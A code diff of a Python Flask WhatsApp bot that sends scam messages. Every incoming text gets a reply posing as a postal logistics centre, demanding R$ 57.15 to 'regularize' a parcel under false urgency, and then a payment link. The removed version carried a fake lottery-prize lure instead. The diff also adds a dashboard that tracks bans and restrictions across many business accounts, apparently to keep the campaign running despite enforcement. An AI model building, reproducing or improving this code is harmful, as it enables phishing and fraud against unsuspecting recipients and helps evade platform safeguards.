@@ -1,17 +1,17 @@
+# app.py
 import os
 import json
 import logging
+import re
 from pathlib import Path
-from typing import Dict, Any, Optional, List
+from typing import Dict, Any, Optional
 from threading import Lock
 from datetime import datetime
-from flask import Flask, request, jsonify, render_template_string
-
+from flask import Flask, request, jsonify, render_template_string, redirect, url_for
 import requests
 
 # ----------------------------------------------------------------------
 app = Flask(__name__)
-
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
@@ -19,47 +19,60 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 VERIFY_TOKEN = os.getenv("VERIFY_TOKEN", "dojunio")
+WHATSAPP_API = "https://graph.facebook.com/v23.0"
 
-# File paths
+# Arquivos
 BMS_FILE = Path("bms.json")
-BANNER_PATH = Path("banner.jpg")
-LINK_FILE = Path("link.txt")
+BANNER_PATH = Path("bannercorreios.jpg")
+LINK_FILE = Path("linkcorreios.txt")
 RESPONDED_FILE = Path("respondidos.txt")
 MESSAGES_FILE = Path("messages.json")
-
 _file_lock = Lock()
 
 # ----------------------------------------------------------------------
-# Load bms.json
+# Carregar bms.json
 def load_bms() -> Dict[str, Any]:
     if not BMS_FILE.is_file():
-        logger.warning("bms.json not found.")
+        logger.warning("bms.json não encontrado.")
         return {}
     try:
         data = json.loads(BMS_FILE.read_text(encoding="utf-8"))
+        for cfg in data.values():
+            cfg.setdefault("waba_id", None)
+            cfg.setdefault("status", "active")
+            cfg.setdefault("quality_rating", "GREEN")
+            cfg.setdefault("messaging_limit", 2000)
+            cfg.setdefault("last_update", "Nunca")
+            cfg.setdefault("ban_info", None)
+            cfg.setdefault("templates", [])
         return data
-    except Exception as exc:
-        logger.exception("Failed to parse bms.json: %s", exc)
+    except Exception as e:
+        logger.exception("Erro ao ler bms.json: %s", e)
         return {}
 
-bms: Dict[str, Any] = load_bms()
+def save_bms(data: Dict):
+    with _file_lock:
+        try:
+            BMS_FILE.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
+        except Exception as e:
+            logger.error("Erro ao salvar bms.json: %s", e)
+
+bms = load_bms()
 
 # ----------------------------------------------------------------------
-# Load link.txt
+# Link de pagamento
 def load_link() -> str:
     if not LINK_FILE.is_file():
         return ""
     try:
-        link = LINK_FILE.read_text(encoding="utf-8").strip()
-        return link
-    except Exception as exc:
-        logger.exception("Failed to read link.txt: %s", exc)
+        return LINK_FILE.read_text(encoding="utf-8").strip()
+    except Exception as e:
+        logger.exception("Erro ao ler linkcorreios.txt: %s", e)
         return ""
-
 PAYMENT_LINK = load_link()
 
 # ----------------------------------------------------------------------
-# Responded users
+# Respondidos
 def load_responded() -> set:
     if not RESPONDED_FILE.is_file():
         return set()
@@ -74,11 +87,11 @@ def save_responded(wa_id: str) -> None:
         try:
             with open(RESPONDED_FILE, "a", encoding="utf-8") as f:
                 f.write(wa_id + "\n")
-        except Exception as exc:
-            logger.error("Failed to write respondidos.txt: %s", exc)
+        except Exception as e:
+            logger.error("Erro ao salvar respondidos.txt: %s", e)
 
 # ----------------------------------------------------------------------
-# Message storage
+# Mensagens
 def load_messages() -> Dict:
     if not MESSAGES_FILE.is_file():
         return {}
@@ -87,81 +100,46 @@ def load_messages() -> Dict:
     except Exception:
         return {}
 
-def save_message(phone_number_id: str, wa_id: str, name: str,
-                 message: str, msg_id: str, timestamp: int):
-    """
-    Store a user message.
-    Key = f"{phone_number_id}_{wa_id}"
-    """
+def save_message(phone_number_id: str, wa_id: str, name: str, message: str, msg_id: str, timestamp: int):
     with _file_lock:
         data = load_messages()
-
-        # -------------------------------------------------
-        # 1. Build the *correct* key
-        # -------------------------------------------------
-        correct_key = f"{phone_number_id}_{wa_id}"
-
-        # -------------------------------------------------
-        # 2. If an old key exists (wrong phone_number_id) → move it
-        # -------------------------------------------------
+        key = f"{phone_number_id}_{wa_id}"
         for old_key in list(data.keys()):
-            if old_key.endswith(f"_{wa_id}") and old_key != correct_key:
-                # Same user, different phone_number_id → merge
+            if old_key.endswith(f"_{wa_id}") and old_key != key:
                 old_chat = data.pop(old_key)
-                # Keep the newer name if needed
-                if correct_key not in data:
-                    data[correct_key] = old_chat
-                    data[correct_key]["phone_number_id"] = phone_number_id
+                if key not in data:
+                    data[key] = old_chat
+                    data[key]["phone_number_id"] = phone_number_id
                 else:
-                    # Merge messages
-                    data[correct_key]["messages"].extend(old_chat["messages"])
-                logger.info("Merged old key %s → %s", old_key, correct_key)
+                    data[key]["messages"].extend(old_chat["messages"])
+                logger.info("Mesclado: %s → %s", old_key, key)
 
-        # -------------------------------------------------
-        # 3. Initialise the chat entry if missing
-        # -------------------------------------------------
-        if correct_key not in data:
-            data[correct_key] = {
-                "phone_number_id": phone_number_id,
-                "wa_id": wa_id,
-                "name": name,
-                "messages": []
-            }
+        if key not in data:
+            data[key] = {"phone_number_id": phone_number_id, "wa_id": wa_id, "name": name, "messages": []}
 
-        # -------------------------------------------------
-        # 4. Append the new message (avoid duplicates)
-        # -------------------------------------------------
-        if not any(m["id"] == msg_id for m in data[correct_key]["messages"]):
-            data[correct_key]["messages"].append({
+        if not any(m["id"] == msg_id for m in data[key]["messages"]):
+            data[key]["messages"].append({
                 "id": msg_id,
                 "text": message,
                 "timestamp": timestamp,
                 "from_user": True
             })
 
-        # -------------------------------------------------
-        # 5. Write back
-        # -------------------------------------------------
         try:
-            MESSAGES_FILE.write_text(
-                json.dumps(data, indent=2, ensure_ascii=False),
-                encoding="utf-8"
-            )
-        except Exception as exc:
-            logger.error("Failed to write messages.json: %s", exc)
+            MESSAGES_FILE.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
+        except Exception as e:
+            logger.error("Erro ao salvar messages.json: %s", e)
 
 # ----------------------------------------------------------------------
-# Find BM
+# Encontrar BM
 def find_bm_by_phone_number_id(phone_id: str) -> Optional[Dict[str, Any]]:
-    for name, cfg in bms.items():
+    for cfg in bms.values():
         if cfg.get("phone_number_id") == phone_id:
             return cfg
     return None
 
 # ----------------------------------------------------------------------
 # WhatsApp API
-WHATSAPP_API = "https://graph.facebook.com/v20.0"
-
 def upload_media(phone_number_id: str, token: str) -> Optional[str]:
     if not BANNER_PATH.is_file():
         return None
@@ -174,25 +152,20 @@ def upload_media(phone_number_id: str, token: str) -> Optional[str]:
             resp = requests.post(url, headers=headers, data=data, files=files, timeout=15)
             resp.raise_for_status()
             return resp.json().get("id")
-    except Exception as exc:
-        logger.error("Upload failed: %s", exc)
+    except Exception as e:
+        logger.error("Upload falhou: %s", e)
         return None
 
-def send_media_message(phone_number_id: str, token: str, to: str, media_id: str) -> None:
+def send_media_message(phone_number_id: str, token: str, to: str, media_id: str):
     url = f"{WHATSAPP_API}/{phone_number_id}/messages"
-    payload = {
-        "messaging_product": "whatsapp",
-        "to": to,
-        "type": "image",
-        "image": {"id": media_id},
-    }
+    payload = {"messaging_product": "whatsapp", "to": to, "type": "image", "image": {"id": media_id}}
     headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
     try:
         requests.post(url, json=payload, headers=headers, timeout=10).raise_for_status()
-    except Exception as exc:
-        logger.error("Send image failed: %s", exc)
+    except Exception as e:
+        logger.error("Envio de imagem falhou: %s", e)
 
-def send_interactive_button(phone_number_id: str, token: str, to: str, body: str) -> None:
+def send_interactive_button(phone_number_id: str, token: str, to: str, body: str):
     url = f"{WHATSAPP_API}/{phone_number_id}/messages"
     payload = {
         "messaging_product": "whatsapp",
@@ -203,32 +176,27 @@ def send_interactive_button(phone_number_id: str, token: str, to: str, body: str
             "body": {"text": body},
             "action": {
                 "buttons": [{"type": "reply", "reply": {"id": "btn_regularizar", "title": "REGULARIZAR"}}]
-            },
-        },
+            }
+        }
     }
     headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
     try:
         requests.post(url, json=payload, headers=headers, timeout=10).raise_for_status()
-    except Exception as exc:
-        logger.error("Send button failed: %s", exc)
+    except Exception as e:
+        logger.error("Botão falhou: %s", e)
 
-def send_link_message(phone_number_id: str, token: str, to: str, link: str) -> None:
+def send_link_message(phone_number_id: str, token: str, to: str, link: str):
     if not link:
         return
     url = f"{WHATSAPP_API}/{phone_number_id}/messages"
-    payload = {
-        "messaging_product": "whatsapp",
-        "to": to,
-        "type": "text",
-        "text": {"body": f"Aqui está o link: {link}"}
-    }
+    payload = {"messaging_product": "whatsapp", "to": to, "type": "text", "text": {"body": f"Aqui está o link: {link}"}}
     headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
     try:
         requests.post(url, json=payload, headers=headers, timeout=10).raise_for_status()
-    except Exception as exc:
-        logger.error("Send link failed: %s", exc)
+    except Exception as e:
+        logger.error("Link falhou: %s", e)
 
-def send_image_and_reply_once(phone_number_id: str, token: str, to: str, body: str, wa_id: str) -> None:
+def send_image_and_reply_once(phone_number_id: str, token: str, to: str, body: str, wa_id: str):
     if wa_id in load_responded():
         return
     media_id = upload_media(phone_number_id, token)
@@ -238,7 +206,16 @@ def send_image_and_reply_once(phone_number_id: str, token: str, to: str, body: s
     save_responded(wa_id)
 
 # ----------------------------------------------------------------------
-# Webhook GET
+REPLY_BODY = """HOJE É O ÚLTIMO DIA PARA REGULARIZAR O SEU PACOTE
+Recebemos sua encomenda em nosso Centro Logístico.
+Para que possamos liberar o envio e garantir a entrega em até 3 dias úteis, é necessário regularizar a situação.
+O valor para a liberação é de R$ 57,15.
+Para dar continuidade, clique no botão abaixo:
+"REGULARIZAR"
+Assim que finalizar, por favor, me envie o comprovante. Estarei à disposição para ajudar."""
+
+# ----------------------------------------------------------------------
+# Webhook: Verificação
 @app.route("/webhook", methods=["GET"])
 def verify():
     mode = request.args.get("hub.mode")
@@ -249,54 +226,45 @@ def verify():
     return "Forbidden", 403
 
 # ----------------------------------------------------------------------
-REPLY_BODY = """Parabéns! 🎉
-Conforme nossos registros, seu CPF consta entre os contemplados da Viva Sorte! Esta é uma excelente oportunidade para realizar o resgate do prêmio.
-
-⚠ Ressaltamos que há um número limitado de confirmações disponíveis, e sua vaga será liberada se não houver retorno dentro das próximas horas.
-
-👉 Confirme e efetue o resgate pelo nosso portal"""
-
+# Webhook: Mensagens + Atualizações
 @app.route("/webhook", methods=["POST"])
-def receive():
+def webhook():
+    global bms
     data = request.get_json(silent=True) or {}
-    logger.info("Evento recebido: %s", data)
+    logger.info("Webhook: %s", json.dumps(data, ensure_ascii=False))
 
     try:
         for entry in data.get("entry", []):
+            waba_id = entry.get("id")
             for change in entry.get("changes", []):
+                field = change.get("field")
                 value = change.get("value", {})
-                phone_number_id = value.get("metadata", {}).get("phone_number_id")
-                if not phone_number_id:
-                    continue
 
-                global bms
-                bms = load_bms()
-                bm_cfg = find_bm_by_phone_number_id(phone_number_id)
-                if not bm_cfg:
-                    continue
-                token = bm_cfg.get("token")
-                if not token:
-                    continue
-
+                # === MENSAGENS ===
                 if "messages" in value:
+                    phone_number_id = value.get("metadata", {}).get("phone_number_id")
+                    if not phone_number_id:
+                        continue
+                    bm_cfg = find_bm_by_phone_number_id(phone_number_id)
+                    if not bm_cfg:
+                        continue
+                    token = bm_cfg.get("token")
+                    if not token:
+                        continue
+
                     for msg in value["messages"]:
                         wa_from = msg.get("from")
                         msg_type = msg.get("type")
                         msg_id = msg.get("id")
                         timestamp = int(msg.get("timestamp", 0))
-
-                        # Get contact name
                         contact = value.get("contacts", [{}])[0]
                         name = contact.get("profile", {}).get("name", "Usuário")
                         wa_id = contact.get("wa_id") or wa_from
 
                         if msg_type == "text":
                             body = msg["text"]["body"]
-                            # Save message
                             save_message(phone_number_id, wa_id, name, body, msg_id, timestamp)
-                            # Send reply once
                             send_image_and_reply_once(phone_number_id, token, wa_from, REPLY_BODY, wa_id)
-
                         elif msg_type == "interactive":
                             interactive = msg.get("interactive", {})
                             if (interactive.get("type") == "button_reply" and
@@ -304,17 +272,236 @@ def receive():
                                 link = load_link() or PAYMENT_LINK
                                 send_link_message(phone_number_id, token, wa_from, link)
 
-                if "statuses" in value:
-                    for st in value["statuses"]:
-                        logger.info("Status: %s", st.get("status"))
-    except Exception as exc:
-        logger.exception("Erro: %s", exc)
+                # === account_alerts ===
+                if field == "account_alerts":
+                    alert = value.get("alert_info", {})
+                    alert_type = alert.get("alert_type", "")
+                    description = alert.get("alert_description", "")
+
+                    for bm_id, cfg in bms.items():
+                        if str(cfg.get("waba_id")) == str(waba_id):
+                            now = datetime.now().astimezone().strftime("%Y-%m-%d %H:%M")
+                            cfg["last_update"] = now
+
+                            if "DISABLED" in alert_type or "BAN" in alert_type:
+                                cfg["status"] = "banned"
+                                cfg["ban_info"] = {"reason": description.split(".")[0], "date": now}
+                            elif "RESTRICTED" in alert_type or "LIMIT" in alert_type:
+                                cfg["status"] = "restricted"
+                                m = re.search(r"(\d+)", description)
+                                if m:
+                                    cfg["messaging_limit"] = int(m.group(1))
+                            elif "QUALITY" in alert_type:
+                                cfg["quality_rating"] = "YELLOW" if "YELLOW" in description else "RED" if "RED" in description else "GREEN"
+                            break
+
+                # === account_update ===
+                elif field == "account_update":
+                    event = value.get("event")
+                    phone_number = value.get("phone_number")
+
+                    for bm_id, cfg in bms.items():
+                        if (cfg.get("phone_number_id") == phone_number or str(cfg.get("waba_id")) == str(waba_id)):
+                            now = datetime.now().astimezone().strftime("%Y-%m-%d %H:%M")
+                            cfg["last_update"] = now
+
+                            if event == "DISABLED_UPDATE":
+                                ban_state = value.get("ban_info", {}).get("waba_ban_state")
+                                ban_date = value.get("ban_info", {}).get("waba_ban_date", now)
+                                if ban_state == "BANNED":
+                                    cfg["status"] = "banned"
+                                    cfg["ban_info"] = {"reason": "Conta desativada", "date": ban_date}
+                                elif ban_state == "REINSTATE":
+                                    cfg["status"] = "active"
+                                    cfg["ban_info"] = None
+
+                            elif event == "RESTRICTION":
+                                cfg["status"] = "restricted"
+                                tier = value.get("restriction_info", {}).get("restricted_messaging_tier", "0")
+                                cfg["messaging_limit"] = int(tier.replace("K", "000").replace("M", "000000"))
+
+                            elif event == "ACCOUNT_VIOLATION":
+                                cfg["status"] = "flagged"
+                                cfg["ban_info"] = {"reason": value.get("violation_info", {}).get("violation_type", "Desconhecido")}
+                            break
+
+        save_bms(bms)
+
+    except Exception as e:
+        logger.exception("Erro no webhook: %s", e)
 
     return jsonify({"status": "ok"}), 200
 
 # ----------------------------------------------------------------------
-# /chat UI
-HTML_TEMPLATE = """
+# Adicionar BM
+@app.route("/add-bm", methods=["POST"])
+def add_bm():
+    global bms
+    bm_name = request.form.get("bm_name")
+    token = request.form.get("token")
+    phone_id = request.form.get("phone_id")
+    waba_id = request.form.get("waba_id")
+
+    if not all([bm_name, token, phone_id, waba_id]):
+        return "Erro: todos os campos são obrigatórios", 400
+
+    if bm_name in bms:
+        return "Erro: BM já existe", 400
+
+    bms[bm_name] = {
+        "phone_number_id": phone_id,
+        "token": token,
+        "waba_id": waba_id,
+        "status": "active",
+        "quality_rating": "GREEN",
+        "messaging_limit": 2000,
+        "last_update": datetime.now().astimezone().strftime("%Y-%m-%d %H:%M"),
+        "ban_info": None,
+        "templates": []
+    }
+
+    save_bms(bms)
+    logger.info("BM %s adicionado!", bm_name)
+    return redirect(url_for("panel"))
+
+# ----------------------------------------------------------------------
+# Painel de Status
+HTML_PANEL = """
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel de Status - WhatsApp BMs</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: #f4f6f9; color: #333; }
+        .container { max-width: 1200px; margin: 16px auto; padding: 16px; }
+        h1 { text-align: center; margin-bottom: 20px; color: #075e54; }
+        .add-btn { display: block; margin: 0 auto 20px; padding: 12px 24px; background: #25d366; color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; }
+        .add-btn:hover { background: #1da851; }
+        .table-container { overflow-x: auto; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); background: white; }
+        table { width: 100%; min-width: 800px; border-collapse: collapse; }
+        th, td { padding: 12px 10px; text-align: left; border-bottom: 1px solid #eee; font-size: 0.9rem; }
+        th { background: #075e54; color: white; position: sticky; top: 0; z-index: 10; }
+        .status { padding: 5px 10px; border-radius: 20px; font-weight: bold; font-size: 0.75rem; min-width: 70px; text-align: center; }
+        .active { background: #d4edda; color: #155724; }
+        .restricted { background: #fff3cd; color: #856404; }
+        .banned { background: #f8d7da; color: #721c24; }
+        .flagged { background: #f1c40f; color: #7f5a00; }
+        .quality.green { color: #28a745; }
+        .quality.yellow { color: #ffc107; }
+        .quality.red { color: #dc3545; }
+        .ban-info { font-size: 0.75rem; }
+        .ban-info strong { color: #721c24; }
+        .refresh { text-align: center; margin-top: 20px; }
+        .refresh button { padding: 12px 24px; background: #075e54; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; }
+        .refresh button:hover { background: #063f38; }
+
+        /* Modal */
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; }
+        .modal-content { background: white; padding: 24px; border-radius: 12px; width: 90%; max-width: 500px; box-shadow: 0 8px 32px rgba(0,0,0,0.2); }
+        .modal-header { display: flex; justify-content: space-between; margin-bottom: 16px; }
+        .modal-header h2 { color: #075e54; }
+        .close { font-size: 1.5rem; cursor: pointer; color: #aaa; }
+        .close:hover { color: #000; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; margin-bottom: 6px; font-weight: 600; }
+        .form-group input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px; }
+        .modal-footer { display: flex; justify-content: flex-end; gap: 10px; margin-top: 20px; }
+        .btn { padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; }
+        .btn-primary { background: #25d366; color: white; }
+        .btn-secondary { background: #ddd; color: #333; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Painel de Status dos BMs</h1>
+        <button class="add-btn" onclick="openModal()">Adicionar BM</button>
+
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>BM</th>
+                        <th>Número</th>
+                        <th>Status</th>
+                        <th>Qualidade</th>
+                        <th>Limite</th>
+                        <th>Atualização</th>
+                        <th>Ban</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for bm_id, cfg in bms.items() %}
+                    <tr>
+                        <td><strong>{{ bm_id }}</strong></td>
+                        <td>{{ cfg.phone_number_id }}</td>
+                        <td><span class="status {{ cfg.status }}">{{ {'active':'Ativo','restricted':'Restrito','banned':'Desativado','flagged':'Sinalizado'}.get(cfg.status,'Ativo') }}</span></td>
+                        <td class="quality {{ cfg.quality_rating.lower() }}">{{ cfg.quality_rating }}</td>
+                        <td>{{ cfg.messaging_limit }}</td>
+                        <td style="white-space: nowrap;">{{ cfg.last_update }}</td>
+                        <td>{% if cfg.ban_info %}<div class="ban-info"><strong>{{ cfg.ban_info.reason }}</strong><br><small>{{ cfg.ban_info.date[:10] }}</small></div>{% else %}—{% endif %}</td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+
+        <div class="refresh">
+            <button onclick="location.reload()">Atualizar Agora</button>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div id="addModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Adicionar Novo BM</h2>
+                <span class="close" onclick="closeModal()">×</span>
+            </div>
+            <form action="/add-bm" method="POST">
+                <div class="form-group">
+                    <label for="bm_name">Nome do BM (ex: 178)</label>
+                    <input type="text" id="bm_name" name="bm_name" required placeholder="178">
+                </div>
+                <div class="form-group">
+                    <label for="token">Token</label>
+                    <input type="text" id="token" name="token" required placeholder="EAA...">
+                </div>
+                <div class="form-group">
+                    <label for="phone_id">Phone Number ID</label>
+                    <input type="text" id="phone_id" name="phone_id" required placeholder="894871697035812">
+                </div>
+                <div class="form-group">
+                    <label for="waba_id">WABA ID</label>
+                    <input type="text" id="waba_id" name="waba_id" required placeholder="102290129340398">
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" onclick="closeModal()">Cancelar</button>
+                    <button type="submit" class="btn btn-primary">Adicionar</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const modal = document.getElementById('addModal');
+        function openModal() { modal.style.display = 'flex'; }
+        function closeModal() { modal.style.display = 'none'; }
+        window.onclick = e => { if (e.target === modal) closeModal(); }
+    </script>
+</body>
+</html>
+"""
+
+@app.route("/")
+def panel():
+    return render_template_string(HTML_PANEL, bms=bms)
+
+# ----------------------------------------------------------------------
+# Chat UI
+HTML_CHAT = """
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -329,10 +516,7 @@ HTML_TEMPLATE = """
         .main { flex: 1; display: flex; flex-direction: column; background: #e5ddd5; }
         .header { padding: 16px; background: #075e54; color: white; font-weight: bold; }
         .bm-list, .chat-list { padding: 8px; }
-        .bm-item, .chat-item {
-            padding: 12px; border-bottom: 1px solid #eee; cursor: pointer; display: flex; align-items: center;
-            transition: background 0.2s;
-        }
+        .bm-item, .chat-item { padding: 12px; border-bottom: 1px solid #eee; cursor: pointer; display: flex; align-items: center; }
         .bm-item:hover, .chat-item:hover { background: #f5f5f5; }
         .bm-name { font-weight: 600; }
         .chat-name { font-weight: 500; flex: 1; }
@@ -361,12 +545,10 @@ HTML_TEMPLATE = """
             <div class="messages" id="messages"></div>
         </div>
     </div>
-
     <script>
         const bms = {{ bms | tojson }};
         let currentBM = null;
         let currentChat = null;
-
         function renderBMs() {
             const list = document.getElementById('bm-list');
             list.innerHTML = '';
@@ -378,7 +560,6 @@ HTML_TEMPLATE = """
                 list.appendChild(div);
             });
         }
-
         async function fetchMessages() {
             try {
                 const resp = await fetch('/chat-data');
@@ -389,23 +570,19 @@ HTML_TEMPLATE = """
                 return {};
             }
         }
-
         async function showChats(bmName, phoneId) {
             currentBM = { name: bmName, phoneId };
             document.getElementById('sidebar').style.display = 'none';
             document.getElementById('main').style.display = 'flex';
             document.getElementById('chat-title').textContent = bmName;
-
             const messages = await fetchMessages();
             const chats = Object.values(messages).filter(m => m.phone_number_id === phoneId);
             const unique = {};
             chats.forEach(chat => {
                 if (!unique[chat.wa_id]) unique[chat.wa_id] = chat;
             });
-
             const chatList = document.createElement('div');
             chatList.className = 'chat-list';
-
             if (Object.keys(unique).length === 0) {
                 chatList.innerHTML = '<div class="empty">Nenhuma conversa ainda.</div>';
             } else {
@@ -427,13 +604,11 @@ HTML_TEMPLATE = """
             messagesDiv.innerHTML = '';
             messagesDiv.appendChild(chatList);
         }
-
         async function showConversation(chat) {
             currentChat = chat;
             const container = document.getElementById('messages');
             container.innerHTML = '';
             document.getElementById('chat-title').textContent = chat.name;
-
             chat.messages.forEach(msg => {
                 const div = document.createElement('div');
                 div.className = `msg ${msg.from_user ? 'user' : 'bot'}`;
@@ -445,7 +620,6 @@ HTML_TEMPLATE = """
             });
             container.scrollTop = container.scrollHeight;
         }
-
         function goBack() {
             currentBM = null;
             currentChat = null;
@@ -453,14 +627,10 @@ HTML_TEMPLATE = """
             document.getElementById('main').style.display = 'none';
             renderBMs();
         }
-
-        // Optional: Refresh only when on chat list (not in conversation)
         setInterval(async () => {
             if (currentBM && !currentChat) {
-                // Only refresh chat list
                 showChats(currentBM.name, currentBM.phoneId);
             } else if (currentChat) {
-                // Refresh current conversation
                 const messages = await fetchMessages();
                 const key = `${currentChat.phone_number_id}_${currentChat.wa_id}`;
                 const updated = messages[key];
@@ -468,8 +638,7 @@ HTML_TEMPLATE = """
                     showConversation(updated);
                 }
             }
-        }, 8000); // Refresh every 8 seconds
-
+        }, 8000);
         renderBMs();
     </script>
 </body>
@@ -482,11 +651,10 @@ def chat_data():
 
 @app.route("/chat")
 def chat_hub():
-    messages = load_messages()
-    return render_template_string(HTML_TEMPLATE, bms=bms, messages=messages)
+    return render_template_string(HTML_CHAT, bms=bms)
 
 # ----------------------------------------------------------------------
 if __name__ == "__main__":
     port = int(os.getenv("PORT", 5000))
-    logger.info("Iniciando na porta %s ...", port)
+    logger.info("Servidor iniciado na porta %s", port)
     app.run(host="0.0.0.0", port=port, debug=False)
